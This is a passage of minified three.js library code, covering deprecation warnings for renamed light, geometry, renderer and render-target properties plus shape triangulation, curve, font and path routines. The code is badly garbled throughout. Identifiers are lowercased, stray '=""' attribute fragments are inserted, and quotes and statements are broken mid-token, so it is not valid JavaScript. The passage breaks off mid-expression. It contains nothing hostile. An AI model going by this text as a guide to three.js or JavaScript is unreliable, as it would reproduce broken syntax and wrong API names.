object.defineproperties(three.lod.prototype,{objects:{get:function(){console.warn(\"three.lod:=\"\" .objects=\"\" .levels.\");return=\"\" this.levels}}});three.perspectivecamera.prototype.setlens=\"function(a,b){console.warn(\" three.perspectivecamera.setlens\"=\"\" deprecated.=\"\" .setfocallength=\"\" and=\"\" .filmgauge=\"\" for=\"\" photographic=\"\" setup.\");void=\"\" 0!=\"=b&&(this.filmGauge=b);this.setFocalLength(a)};\" object.defineproperties(three.light.prototype,{onlyshadow:{set:function(a){console.warn(\"three.light:=\"\" .onlyshadow=\"\" removed.\")}},shadowcamerafov:{set:function(a){console.warn(\"three.light:=\"\" .shadowcamerafov=\"\" .shadow.camera.fov.\");this.shadow.camera.fov=\"a}},shadowCameraLeft:{set:function(a){console.warn(\" three.light:\"=\"\" .shadowcameraleft=\"\" .shadow.camera.left.\");this.shadow.camera.left=\"a}},shadowCameraRight:{set:function(a){console.warn(\" .shadowcameraright=\"\" .shadow.camera.right.\");=\"\" this.shadow.camera.right=\"a}},shadowCameraTop:{set:function(a){console.warn(\" .shadowcameratop=\"\" .shadow.camera.top.\");this.shadow.camera.top=\"a}},shadowCameraBottom:{set:function(a){console.warn(\" .shadowcamerabottom=\"\" .shadow.camera.bottom.\");this.shadow.camera.bottom=\"a}},shadowCameraNear:{set:function(a){console.warn(\" .shadowcameranear=\"\" .shadow.camera.near.\");this.shadow.camera.near=\"a}},shadowCameraFar:{set:function(a){console.warn(\" .shadowcamerafar=\"\" .shadow.camera.far.\");=\"\" this.shadow.camera.far=\"a}},shadowCameraVisible:{set:function(a){console.warn(\" .shadowcameravisible=\"\" three.camerahelper(=\"\" light.shadow.camera=\"\" instead.\")}},shadowbias:{set:function(a){console.warn(\"three.light:=\"\" .shadowbias=\"\" .shadow.bias.\");this.shadow.bias=\"a}},shadowDarkness:{set:function(a){console.warn(\" .shadowdarkness=\"\" removed.\")}},shadowmapwidth:{set:function(a){console.warn(\"three.light:=\"\" .shadowmapwidth=\"\" .shadow.mapsize.width.\");=\"\" this.shadow.mapsize.width=\"a}},shadowMapHeight:{set:function(a){console.warn(\" .shadowmapheight=\"\" .shadow.mapsize.height.\");this.shadow.mapsize.height=\"a}}});Object.defineProperties(THREE.BufferAttribute.prototype,{length:{get:function(){console.warn(\" three.bufferattribute:\"=\"\" .length=\"\" please=\"\" .count.\");return=\"\" this.array.length}}});=\"\" object.assign(three.buffergeometry.prototype,{addindex:function(a){console.warn(\"three.buffergeometry:=\"\" .addindex()=\"\" .setindex().\");this.setindex(a)},adddrawcall:function(a,b,c){void=\"\" .adddrawcall()=\"\" no=\"\" longer=\"\" supports=\"\" indexoffset.\");console.warn(\"three.buffergeometry:=\"\" .addgroup().\");this.addgroup(a,b)},cleardrawcalls:function(){console.warn(\"three.buffergeometry:=\"\" .cleardrawcalls()=\"\" .cleargroups().\");this.cleargroups()},=\"\" computetangents:function(){console.warn(\"three.buffergeometry:=\"\" .computetangents()=\"\" removed.\")},computeoffsets:function(){console.warn(\"three.buffergeometry:=\"\" .computeoffsets()=\"\" removed.\")}});object.defineproperties(three.buffergeometry.prototype,{drawcalls:{get:function(){console.error(\"three.buffergeometry:=\"\" .drawcalls=\"\" .groups.\");return=\"\" this.groups}},offsets:{get:function(){console.warn(\"three.buffergeometry:=\"\" .offsets=\"\" this.groups}}});=\"\" object.defineproperties(three.material.prototype,{wraparound:{get:function(){console.warn(\"three.\"+this.type+\":=\"\" .wraparound=\"\" removed.\")},set:function(a){console.warn(\"three.\"+this.type+\":=\"\" removed.\")}},wraprgb:{get:function(){console.warn(\"three.\"+this.type+\":=\"\" .wraprgb=\"\" removed.\");return=\"\" three.color}}});=\"\" object.defineproperties(three.meshphongmaterial.prototype,{metal:{get:function(){console.warn(\"three.meshphongmaterial:=\"\" .metal=\"\" three.meshstandardmaterial=\"\" instead.\");return!1},set:function(a){console.warn(\"three.meshphongmaterial:=\"\" instead\")}}});=\"\" object.defineproperties(three.shadermaterial.prototype,{derivatives:{get:function(){console.warn(\"three.shadermaterial:=\"\" .derivatives=\"\" moved=\"\" .extensions.derivatives.\");return=\"\" this.extensions.derivatives},set:function(a){console.warn(\"three.=\"\" shadermaterial:=\"\" .extensions.derivatives.\");this.extensions.derivatives=\"a}}});\" three.eventdispatcher.prototype=\"Object.assign(Object.create({constructor:THREE.EventDispatcher,apply:function(a){console.warn(\" three.eventdispatcher:\"=\"\" .apply=\"\" deprecated,=\"\" just=\"\" inherit=\"\" object.assign=\"\" prototype=\"\" mix-in.\");object.assign(a,this)}}),three.eventdispatcher.prototype);=\"\" object.assign(three.webglrenderer.prototype,{supportsfloattextures:function(){console.warn(\"three.webglrenderer:=\"\" .supportsfloattextures()=\"\" .extensions.get(=\"\" 'oes_texture_float'=\"\" ).\");return=\"\" this.extensions.get(\"oes_texture_float\")},supportshalffloattextures:function(){console.warn(\"three.webglrenderer:=\"\" .supportshalffloattextures()=\"\" 'oes_texture_half_float'=\"\" this.extensions.get(\"oes_texture_half_float\")},supportsstandardderivatives:function(){console.warn(\"three.webglrenderer:=\"\" .supportsstandardderivatives()=\"\" 'oes_standard_derivatives'=\"\" ).\");=\"\" this.extensions.get(\"oes_standard_derivatives\")},supportscompressedtextures3tc:function(){console.warn(\"three.webglrenderer:=\"\" .supportscompressedtextures3tc()=\"\" 'webgl_compressed_texture_s3tc'=\"\" this.extensions.get(\"webgl_compressed_texture_s3tc\")},supportscompressedtexturepvrtc:function(){console.warn(\"three.webglrenderer:=\"\" .supportscompressedtexturepvrtc()=\"\" 'webgl_compressed_texture_pvrtc'=\"\" this.extensions.get(\"webgl_compressed_texture_pvrtc\")},=\"\" supportsblendminmax:function(){console.warn(\"three.webglrenderer:=\"\" .supportsblendminmax()=\"\" 'ext_blend_minmax'=\"\" this.extensions.get(\"ext_blend_minmax\")},supportsvertextextures:function(){return=\"\" this.capabilities.vertextextures},supportsinstancedarrays:function(){console.warn(\"three.webglrenderer:=\"\" .supportsinstancedarrays()=\"\" 'angle_instanced_arrays'=\"\" this.extensions.get(\"angle_instanced_arrays\")},enablescissortest:function(a){console.warn(\"three.webglrenderer:=\"\" .enablescissortest()=\"\" .setscissortest().\");=\"\" this.setscissortest(a)},initmaterial:function(){console.warn(\"three.webglrenderer:=\"\" .initmaterial()=\"\" removed.\")},addpreplugin:function(){console.warn(\"three.webglrenderer:=\"\" .addpreplugin()=\"\" removed.\")},addpostplugin:function(){console.warn(\"three.webglrenderer:=\"\" .addpostplugin()=\"\" removed.\")},updateshadowmap:function(){console.warn(\"three.webglrenderer:=\"\" .updateshadowmap()=\"\" removed.\")}});=\"\" object.defineproperties(three.webglrenderer.prototype,{shadowmapenabled:{get:function(){return=\"\" this.shadowmap.enabled},set:function(a){console.warn(\"three.webglrenderer:=\"\" .shadowmapenabled=\"\" .shadowmap.enabled.\");this.shadowmap.enabled=\"a}},shadowMapType:{get:function(){return\" this.shadowmap.type},set:function(a){console.warn(\"three.webglrenderer:=\"\" .shadowmaptype=\"\" .shadowmap.type.\");this.shadowmap.type=\"a}},shadowMapCullFace:{get:function(){return\" this.shadowmap.cullface},set:function(a){console.warn(\"three.webglrenderer:=\"\" .shadowmapcullface=\"\" .shadowmap.cullface.\");=\"\" this.shadowmap.cullface=\"a}}});Object.defineProperties(THREE.WebGLShadowMap.prototype,{cullFace:{get:function(){return\" this.renderreversesided?three.cullfacefront:three.cullfaceback},set:function(a){a=\"a!==THREE.CullFaceBack;console.warn(\" webglrenderer:\"=\"\" .shadowmap.cullface=\"\" set=\"\" .shadowmap.renderreversesided=\"\" \"+a+\".\");this.renderreversesided=\"a}}});\" object.defineproperties(three.webglrendertarget.prototype,{wraps:{get:function(){console.warn(\"three.webglrendertarget:=\"\" .wraps=\"\" .texture.wraps.\");return=\"\" this.texture.wraps},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.wraps.\");this.texture.wraps=\"a}},wrapT:{get:function(){console.warn(\" three.webglrendertarget:\"=\"\" .wrapt=\"\" .texture.wrapt.\");return=\"\" this.texture.wrapt},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.wrapt.\");this.texture.wrapt=\"a}},magFilter:{get:function(){console.warn(\" .magfilter=\"\" .texture.magfilter.\");return=\"\" this.texture.magfilter},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.magfilter.\");this.texture.magfilter=\"a}},minFilter:{get:function(){console.warn(\" .minfilter=\"\" .texture.minfilter.\");return=\"\" this.texture.minfilter},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.minfilter.\");this.texture.minfilter=\"a}},anisotropy:{get:function(){console.warn(\" .anisotropy=\"\" .texture.anisotropy.\");return=\"\" this.texture.anisotropy},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.anisotropy.\");this.texture.anisotropy=\"a}},offset:{get:function(){console.warn(\" .offset=\"\" .texture.offset.\");return=\"\" this.texture.offset},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.offset.\");this.texture.offset=\"a}},repeat:{get:function(){console.warn(\" .repeat=\"\" .texture.repeat.\");return=\"\" this.texture.repeat},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.repeat.\");this.texture.repeat=\"a}},format:{get:function(){console.warn(\" .format=\"\" .texture.format.\");return=\"\" this.texture.format},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.format.\");this.texture.format=\"a}},type:{get:function(){console.warn(\" .type=\"\" .texture.type.\");=\"\" this.texture.type},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.type.\");this.texture.type=\"a}},generateMipmaps:{get:function(){console.warn(\" .generatemipmaps=\"\" .texture.generatemipmaps.\");return=\"\" this.texture.generatemipmaps},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.generatemipmaps.\");this.texture.generatemipmaps=\"a}}});\" object.assign(three.audio.prototype,{load:function(a){console.warn(\"three.audio:=\"\" .load=\"\" three.audioloader.\");var=\"\" b=\"this;(new\" three.audioloader).load(a,function(a){b.setbuffer(a)});return=\"\" this}});object.assign(three.audioanalyser.prototype,{getdata:function(a){console.warn(\"three.audioanalyser:=\"\" .getdata()=\"\" .getfrequencydata().\");return=\"\" this.getfrequencydata()}});=\"\" three.geometryutils=\"{merge:function(a,b,c){console.warn(\" three.geometryutils:\"=\"\" .merge()=\"\" geometry.=\"\" geometry.merge(=\"\" geometry2,=\"\" matrix,=\"\" materialindexoffset=\"\" instead.\");var=\"\" d;b=\"\" instanceof=\"\" three.mesh&&(b.matrixautoupdate&&b.updatematrix(),d=\"b.matrix,b=b.geometry);a.merge(b,d,c)},center:function(a){console.warn(\" .center()=\"\" geometry.center()=\"\" a.center()}};=\"\" three.imageutils=\"{crossOrigin:void\" 0,loadtexture:function(a,b,c,d){console.warn(\"three.imageutils.loadtexture=\"\" three.textureloader()=\"\" e=\"new\" three.textureloader;e.setcrossorigin(this.crossorigin);a=\"e.load(a,c,void\" 0,d);b&&(a.mapping=\"b);return\" a},loadtexturecube:function(a,b,c,d){console.warn(\"three.imageutils.loadtexturecube=\"\" three.cubetextureloader()=\"\" three.cubetextureloader;e.setcrossorigin(this.crossorigin);a=\"e.load(a,\" c,void=\"\" a},loadcompressedtexture:function(){console.error(\"three.imageutils.loadcompressedtexture=\"\" three.ddsloader=\"\" instead.\")},loadcompressedtexturecube:function(){console.error(\"three.imageutils.loadcompressedtexturecube=\"\" instead.\")}};=\"\" three.projector=\"function(){console.error(\" three.projector\"=\"\" examples=\"\" js=\"\" renderers=\"\" projector.js.\");this.projectvector=\"function(a,b){console.warn(\" three.projector:\"=\"\" .projectvector()=\"\" vector.project().\");a.project(b)};this.unprojectvector=\"function(a,b){console.warn(\" .unprojectvector()=\"\" vector.unproject().\");a.unproject(b)};this.pickingray=\"function(a,b){console.error(\" .pickingray()=\"\" raycaster.setfromcamera().\")}};=\"\" three.canvasrenderer=\"function(){console.error(\" three.canvasrenderer\"=\"\" canvasrenderer.js\");this.domelement=\"document.createElementNS(\" http:=\"\" www.w3.org=\"\" xhtml\",\"canvas\");this.clear=\"function(){};this.render=function(){};this.setClearColor=function(){};this.setSize=function(){}};\"\" three.curveutils=\"{tangentQuadraticBezier:function(a,b,c,d){return\" 2*(1-a)*(c-b)+2*a*(d-c)},tangentcubicbezier:function(a,b,c,d,e){return-3*b*(1-a)*(1-a)+3*c*(1-a)*(1-a)-6*a*c*(1-a)+6*a*d*(1-a)-3*a*a*d+3*a*a*e},tangentspline:function(a,b,c,d,e){return=\"\" 6*a*a-6*a+(3*a*a-4*a+1)+(-6*a*a+6*a)+(3*a*a-2*a)},interpolate:function(a,b,c,d,e){a=\".5*(c-a);d=.5*(d-b);var\" f=\"e*e;return(2*b-2*c+a+d)*e*f+(-3*b+3*c-2*a-d)*f+a*e+b}};\" three.sceneutils=\"{createMultiMaterialObject:function(a,b){for(var\" c=\"new\" three.group,d=\"0,e=b.length;d<e;d++)c.add(new\" three.mesh(a,b[d]));return=\"\" c},detach:function(a,b,c){a.applymatrix(b.matrixworld);b.remove(a);c.add(a)},attach:function(a,b,c){var=\"\" d=\"new\" three.matrix4;d.getinverse(c.matrixworld);a.applymatrix(d);b.remove(a);c.add(a)}};=\"\" three.shapeutils=\"{area:function(a){for(var\" function(a,b){var=\"\">c)return null;var d=[],e=[],f=[],g,h,k;if(0<three.shapeutils.area(a))for(h=0;h<c;h++)e[h]=h;else for(h=\"0;h<c;h++)e[h]=c-1-h;var\" l=\"2*c;for(h=c-1;2<c;){if(0\">=l--){console.warn(\"THREE.ShapeUtils: Unable to triangulate polygon! in triangulate()\");break}g=h;c<=g&&(g=0);h=g+1;c<=h&&(h=0);k=h+1;c<=k&&(k=0);var n;a:{var=\"\" p=\"n=void\" 0,m=\"void\" 0,q=\"void\" 0,r=\"void\" 0,s=\"void\" 0,t=\"void\" 0,u=\"void\" 0,v=\"void\" 0,p=\"a[e[g]].x,m=a[e[g]].y,q=a[e[h]].x,r=a[e[h]].y,s=a[e[k]].x,t=a[e[k]].y;if(Number.EPSILON\">(q-p)*(t-m)-(r-m)*(s-p))n=!1;else{var C=void 0,w=void 0,E=void 0,z=void 0,y=void 0,A=void 0,I=void 0,B=void 0,F=void 0,K=void 0,F=B=I=v=u=void 0,C=s-q,w=t-r,E=p-s,z=m-t,y=q-p,A=r-m;for(n=0;n<c;n++)if(u=a[e[n]].x,v=a[e[n]].y,!(u===p&&v===m||u===q&&v===r||u===s&&v===t)&&(i=u-p,b=v-m,f=u-q,k=v-r,u-=s,v-=t,f=c*k-w*f,i=y*b-a*i,b=e*v-z*u,f>=-Number.EPSILON&&\nB>=-Number.EPSILON&&I>=-Number.EPSILON)){n=!1;break a}n=!0}}if(n){d.push([a[e[g]],a[e[h]],a[e[k]]]);f.push([e[g],e[h],e[k]]);g=h;for(k=h+1;k<c;g++,k++)e[g]=e[k];c--;l=2*c}}return b?f:d}}(),triangulateshape:function(a,b){function=\"\" c(a,b,c){return=\"\" a.x!=\"=b.x?a.x<b.x?a.x<=c.x&&c.x<=b.x:b.x<=c.x&&c.x<=a.x:a.y<b.y?a.y<=c.y&&c.y<=b.y:b.y<=c.y&&c.y<=a.y}function\" d(a,b,d,e,f){var=\"\" g=\"b.x-a.x,h=b.y-a.y,k=e.x-d.x,l=e.y-d.y,n=a.x-d.x,p=a.y-d.y,y=h*k-g*l,A=h*n-g*p;if(Math.abs(y)\">Number.EPSILON){if(0<y){if(0>A||A>\ny)return[];k=l*n-k*p;if(0>k||k>y)return[]}else{if(0<a||a<y)return[];k=l*n-k*p;if(0<k||k<y)return[]}if(0===k)return!f||0!==a&&a!==y?[a]:[];if(k===y)return!f||0!==a&&a!==y?[b]:[];if(0===a)return[d];if(a===y)return[e];f=k y;return[{x:a.x+f*g,y:a.y+f*h}]}if(0!=\"=A||l*n!==k*p)return[];h=0===g&&0===h;k=0===k&&0===l;if(h&&k)return\" a.x!=\"=d.x||a.y!==d.y?[]:[a];if(h)return\" c(d,e,a)?[a]:[];if(k)return=\"\" c(a,b,d)?[d]:[];0!=\"=g?(a.x<b.x?(g=a,k=a.x,h=b,a=b.x):(g=b,k=b.x,h=a,a=a.x),d.x<e.x?(b=d,y=d.x,l=e,d=e.x):(b=\" e,y=\"e.x,l=d,d=d.x)):(a.y<b.y?(g=a,k=a.y,h=b,a=b.y):(g=b,k=b.y,h=a,a=a.y),d.y<e.y?(b=d,y=d.y,l=e,d=e.y):(b=e,y=e.y,l=d,d=d.y));return\" k<=\"y?a<y?[]:a===y?f?[]:[b]:a<=d?[b,h]:[b,l]:k\">d?[]:k===d?f?[]:[g]:a<=d?[g,h]:[g,l]}function e(a,b,c,d){var=\"\" e=\"b.x-a.x,f=b.y-a.y;b=c.x-a.x;c=c.y-a.y;var\" g=\"d.x-a.x;d=d.y-a.y;a=e*c-f*b;e=e*d-f*g;return\" math.abs(a)=\"\">Number.EPSILON?(b=g*c-d*b,0<a?0<=e&&0<=b:0<=e||0<=b):0<e}var f,g,h,k,l,n=\"{};h=a.concat();f=0;for(g=b.length;f<g;f++)Array.prototype.push.apply(h,b[f]);f=0;for(g=\" h.length;f<g;f++)l=\"h[f].x+\" :\"+h[f].y,void\"=\"\" 0!=\"=n[l]&&console.warn(\" three.shape:\"=\"\" duplicate=\"\" point\",l),n[l]=\"f;f=function(a,b){function\" c(a,b){var=\"\" d=\"h.length-1,f=a-1;0\">f&&(f=d);var g=a+1;g>d&&(g=0);d=e(h[a],h[f],h[g],k[b]);if(!d)return!1;d=k.length-1;f=b-1;0>f&&(f=d);g=b+1;g>d&&(g=0);return(d=e(k[b],k[f],k[g],h[a]))?!0:!1}function f(a,b){var c,e;for(c=0;c<h.length;c++)if(e=c+1,e%=h.length,e=d(a,b,h[c],h[e],!0),0<e.length)return!0;return!1}function g(a,c){var=\"\" e,f,h,k;for(e=\"0;e<l.length;e++)for(f=b[l[e]],\" h=\"0;h<f.length;h++)if(k=h+1,k%=f.length,k=d(a,c,f[h],f[k],!0),0<k.length)return!0;return!1}var\" m=\"2*l.length;0<l.length;){M--;if(0\">M){console.log(\"Infinite Loop! Holes left:\"+l.length+\", Probably Hole outside Shape!\");break}for(p=B;p<h.length;p++){z=h[p];n=-1;for(p=0;p<l.length;p++)if(y=l[p],a=z.x+\":\"+z.y+\":\"+y,void 0=\"==I[A]){k=b[y];for(F=0;F<k.length;F++)if(y=k[F],c(p,F)&&!f(z,y)&&!g(z,y)){n=F;l.splice(P,1);\" b=\"h.slice(0,p+1);y=h.slice(p);F=k.slice(n);K=k.slice(0,n+1);h=B.concat(F).concat(K).concat(y);B=p;break}if(0<=n)break;I[A]=!0}if(0<=n)break}}return\" h}(a,b);var=\"\" p=\"THREE.ShapeUtils.triangulate(f,!1);f=0;for(g=p.length;f<g;f++)for(k=p[f],h=0;3\">h;h++)l=k[h].x+\":\"+k[h].y,l=n[l],void 0!==l&&(k[h]=l);return p.concat()},isClockWise:function(a){return 0>THREE.ShapeUtils.area(a)},b2:function(){return function(a,b,c,d){var e=1-a;return e*e*b+2*(1-a)*a*c+a*a*d}}(),b3:function(){return function(a,b,c,d,e){var f=\n1-a,g=1-a;return f*f*f*b+3*g*g*a*c+3*(1-a)*a*a*d+a*a*a*e}}()};THREE.Curve=function(){};\nTHREE.Curve.prototype={constructor:THREE.Curve,getPoint:function(a){console.warn(\"THREE.Curve: Warning, getPoint() not implemented!\");return null},getPointAt:function(a){a=this.getUtoTmapping(a);return this.getPoint(a)},getPoints:function(a){a||(a=5);var b,c=[];for(b=0;b<=a;b++)c.push(this.getpoint(b a));return=\"\" c},getspacedpoints:function(a){a||(a=\"5);var\" b,c=\"[];for(b=0;b<=a;b++)c.push(this.getPointAt(b/a));return\" c},getlength:function(){var=\"\" a=\"this.getLengths();return\" a[a.length-1]},getlengths:function(a){a||=\"\" (a=\"this.__arcLengthDivisions?this.__arcLengthDivisions:200);if(this.cacheArcLengths&&this.cacheArcLengths.length===a+1&&!this.needsUpdate)return\" this.cachearclengths;this.needsupdate=\"!1;var\" b=\"[],c,d=this.getPoint(0),e,f=0;b.push(0);for(e=1;e<=a;e++)c=this.getPoint(e/a),f+=c.distanceTo(d),b.push(f),d=c;return\" this.cachearclengths=\"b},updateArcLengths:function(){this.needsUpdate=!0;this.getLengths()},getUtoTmapping:function(a,b){var\" c=\"this.getLengths(),d=0,e=c.length,f;f=b?b:a*c[e-1];for(var\" g=\"0,h=e-\" 1,k;g<=\"h;)if(d=Math.floor(g+(h-g)/2),k=c[d]-f,0\">k)g=d+1;else if(0<k)h=d-1;else{h=d;break}d=h;if(c[d]===f)return d=\"\" (e-1);g=\"c[d];return\" c=\"(d+(f-g)/(c[d+1]-g))/(e-1)},getTangent:function(a){var\" b=\"a-1E-4;a+=1E-4;0\">b&&(b=0);1<a&&(a=1);b=this.getpoint(b);return this.getpoint(a).clone().sub(b).normalize()},gettangentat:function(a){a=\"this.getUtoTmapping(a);return\" this.gettangent(a)}};=\"\" three.curve.create=\"function(a,b){a.prototype=Object.create(THREE.Curve.prototype);a.prototype.constructor=a;a.prototype.getPoint=b;return\" a};three.curvepath=\"function(){this.curves=[];this.autoClose=!1};\" three.curvepath.prototype=\"Object.assign(Object.create(THREE.Curve.prototype),{constructor:THREE.CurvePath,add:function(a){this.curves.push(a)},closePath:function(){var\" a=\"this.curves[0].getPoint(0),b=this.curves[this.curves.length-1].getPoint(1);a.equals(b)||this.curves.push(new\" three.linecurve(b,a))},getpoint:function(a){for(var=\"\" b=\"a*this.getLength(),c=this.getCurveLengths(),d=0;d<c.length;){if(c[d]\">=b)return a=this.curves[d],b=1-(c[d]-b)/a.getLength(),a.getPointAt(b);d++}return null},getLength:function(){var a=\nthis.getCurveLengths();return a[a.length-1]},updateArcLengths:function(){this.needsUpdate=!0;this.cacheLengths=null;this.getLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var a=[],b=0,c=0,d=this.curves.length;c<d;c++)b+=this.curves[c].getlength(),a.push(b);return 0=\"==b&&(b=100);void\" this.cachelengths=\"a},createPointsGeometry:function(a){a=this.getPoints(a);return\" this.creategeometry(a)},createspacedpointsgeometry:function(a){a=\"this.getSpacedPoints(a);\" return=\"\" this.creategeometry(a)},creategeometry:function(a){for(var=\"\" b=\"new\" three.geometry,c=\"0,d=a.length;c<d;c++){var\" e=\"a[c];b.vertices.push(new\" three.vector3(e.x,e.y,e.z||0))}return=\"\" b}});three.font=\"function(a){this.data=a};\" object.assign(three.font.prototype,{generateshapes:function(a,b,c){void=\"\" d=\"this.data;a=String(a).split(\" \");var\"=\"\" g=\"0;g<a.length;g++){var\" h;h=\"e;var\" k=\"f,l=d.glyphs[a[g]]||d.glyphs[\" ?\"];if(l){var\"=\"\" n=\"new\" three.path,p=\"[],m=THREE.ShapeUtils.b2,q=THREE.ShapeUtils.b3,r=void\" 0,s=\"void\" 0,t=\"s=r=void\" 0,u=\"void\" 0,v=\"void\" 0,c=\"void\" 0,w=\"void\" 0,e=\"void\" 0;if(l.o)for(var=\"\" z=\"l._cachedOutline||(l._cachedOutline=l.o.split(\" \"=\"\" \")),y=\"0,A=z.length;y<A;)switch(z[y++]){case\" \"m\":r=\"z[y++]*h+k;s=z[y++]*h;n.moveTo(r,s);break;case\" \"l\":r=\"z[y++]*h+k;s=z[y++]*h;n.lineTo(r,s);break;case\" \"q\":r=\"z[y++]*h+k;s=z[y++]*h;v=z[y++]*h+k;C=z[y++]*h;n.quadraticCurveTo(v,C,r,s);if(u=p[p.length-1])for(var\" t=\"u.x,u=u.y,I=1;I<=c;I++){var\" \"b\":if(r=\"z[y++]*h+k,s=z[y++]*h,v=z[y++]*h+k,C=z[y++]*h,w=z[y++]*h+k,E=z[y++]*h,n.bezierCurveTo(v,C,w,E,r,s),u=p[p.length-1])for(t=u.x,u=u.y,I=1;I<=c;I++)B=I/c,q(B,t,v,w,r),q(B,u,C,E,s)}h={offset:l.ha*h,path:n}}else\" h=\"void\" 0;f+=\"h.offset;b.push(h.path)}c=[];d=0;for(a=b.length;d<a;d++)Array.prototype.push.apply(c,b[d].toShapes());return\" c}});three.path=\"function(a){THREE.CurvePath.call(this);this.actions=[];a&&this.fromPoints(a)};\" three.path.prototype=\"Object.assign(Object.create(THREE.CurvePath.prototype),{constructor:THREE.Path,fromPoints:function(a){this.moveTo(a[0].x,a[0].y);for(var\" c=\"this.actions[this.actions.length-1].args,c=new\" three.linecurve(new=\"\" three.vector2(c[c.length-2],c[c.length-1]),new=\"\" three.vector2(a,b));this.curves.push(c);this.actions.push({action:\"lineto\",args:[a,=\"\" b]})},quadraticcurveto:function(a,b,c,d){var=\"\" three.quadraticbeziercurve(new=\"\" three.vector2(e[e.length-2],e[e.length-1]),new=\"\" three.vector2(a,b),new=\"\" three.vector2(c,d));this.curves.push(e);this.actions.push({action:\"quadraticcurveto\",args:[a,b,c,d]})},beziercurveto:function(a,b,c,d,e,f){var=\"\" three.cubicbeziercurve(new=\"\" three.vector2(g[g.length-2],g[g.length-1]),new=\"\" three.vector2(c,d),=\"\" new=\"\" three.vector2(e,f));this.curves.push(g);this.actions.push({action:\"beziercurveto\",args:[a,b,c,d,e,f]})},splinethru:function(a){var=\"\" three.vector2(c[c.length-2],c[c.length-1])];array.prototype.push.apply(c,a);c=\"new\" three.splinecurve(c);this.curves.push(c);c=\"a[a.length-1];b.push(c.x);b.push(c.y);this.actions.push({action:\" splinethru\",args:b})},arc:function(a,b,c,d,e,f){var\"=\"\" 1].args;this.absarc(a+g[g.length-2],b+g[g.length-1],c,d,e,f)},absarc:function(a,b,c,d,e,f){this.absellipse(a,b,c,c,d,e,f)},ellipse:function(a,b,c,d,e,f,g,h){var=\"\" three.ellipsecurve(a,b,c,d,e,f,g,h);this.curves.push(a);a=\"a.getPoint(1);k.push(a.x);k.push(a.y);this.actions.push({action:\" ellipse\",args:k})},getspacedpoints:function(a){a||\"=\"\" (a=\"40);for(var\" b},getpoints:function(a){a=\"a||12;for(var\" \"moveto\":d.push(new=\"\" three.vector2(t[0],t[1]));break;case=\"\" \"lineto\":d.push(new=\"\" \"quadraticcurveto\":e=\"t[2];f=t[3];k=t[0];l=t[1];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-\" 1].args,n=\"m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=b(q,n,k,e),q=b(q,p,l,f),d.push(new\" three.vector2(m,q));break;case=\"\" \"beziercurveto\":e=\"t[4];f=t[5];k=t[0];l=t[1];g=t[2];h=t[3];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-1].args,n=m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=c(q,n,k,g,e),q=c(q,p,l,h,f),d.push(new\" \"splinethru\":m=\"this.actions[r-1].args;q=[new\" three.vector2(m[m.length-2],m[m.length-1])];m=\"a*t[0].length;q=q.concat(t[0]);\" q=\"new\" three.splinecurve(q);for(t=\"1;t<=m;t++)d.push(q.getPointAt(t/m));break;case\" \"arc\":e=\"t[0];f=t[1];l=t[2];g=t[3];m=t[4];k=!!t[5];n=m-g;p=2*a;for(t=1;t<=p;t++)q=t/p,k||(q=1-q),q=g+q*n,m=e+l*Math.cos(q),q=f+l*Math.sin(q),d.push(new\" \"ellipse\":e=\"t[0];f=t[1];l=t[2];h=t[3];g=t[4];m=t[5];k=!!t[6];var\" u=\"t[7];n=m-g;p=2*a;var\" v,c;0!=\"=u&&(v=Math.cos(u),C=Math.sin(u));for(t=1;t<=p;t++){q=t/p;k||(q=1-q);q=g+q*n;m=e+l*Math.cos(q);q=f+h*Math.sin(q);if(0!==u){var\" w=\"m;m=(w-e)*v-(q-\" f)*c+e;q=\"(w-e)*C+(q-f)*v+f}d.push(new\" three.vector2(m,q))}}}a=\"d[d.length-1];Math.abs(a.x-d[0].x)<Number.EPSILON&&Math.abs(a.y-d[0].y)<Number.EPSILON&&d.splice(d.length-1,1);this.autoClose&&d.push(d[0]);return\" d},toshapes:function(a,b){function=\"\" c(a){for(var=\"\" three.shape;f.actions=\"e.actions;f.curves=e.curves;b.push(f)}return\" b}function=\"\" d(a,b){for(var=\"\">Number.EPSILON){if(0>\nl&&(g=b[f],k=-k,h=b[e],l=-l),!(a.y<g.y||a.y>h.y))if(a.y===g.y){if(a.x===g.x)return!0}else{e=l*(a.x-g.x)-k*(a.y-g.y);if(0===e)return!0;0>e||(d=!d)}}else if(a.y===g.y&&(h.x<=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return 0=\"=a?[]:a};\" d}var=\"\" e=\"THREE.ShapeUtils.isClockWise,f=function(a){for(var\" b=\"[],c=new\" three.path,d=\"0,e=a.length;d<e;d++){var\" f=\"a[d],g=f.args,f=f.action;\" moveto\"=\"==f&&0!==c.actions.length&&(b.push(c),c=new\"\" three.path);c[f].apply(c,g)}0!=\"=c.actions.length&&b.push(c);return\" b}(this.actions);if(0=\"==\" f.length)return[];if(!0=\"==b)return\" c(f);var=\"\" g,h,k,l=\"[];if(1===f.length)return\" h=\"f[0],k=new\" three.shape,k.actions=\"h.actions,k.curves=h.curves,l.push(k),l;var\" n=\"!e(f[0].getPoints()),n=a?!n:n;k=[];var\" p=\"[],m=[],q=0,r;p[q]=void\" 0;m[q]=\"[];for(var\" s=\"0,t=f.length;s<t;s++)h=f[s],r=h.getPoints(),g=e(r),(g=a?!g:g)?(!n&&p[q]&&q++,p[q]={s:new\" three.shape,p:r},p[q].s.actions=\"h.actions,p[q].s.curves=h.curves,n&&q++,m[q]=[]):m[q].push({h:h,p:r[0]});if(!p[0])return\" c(f);if(1<p.length){s=\"!1;h=[];e=0;for(f=p.length;e<\" 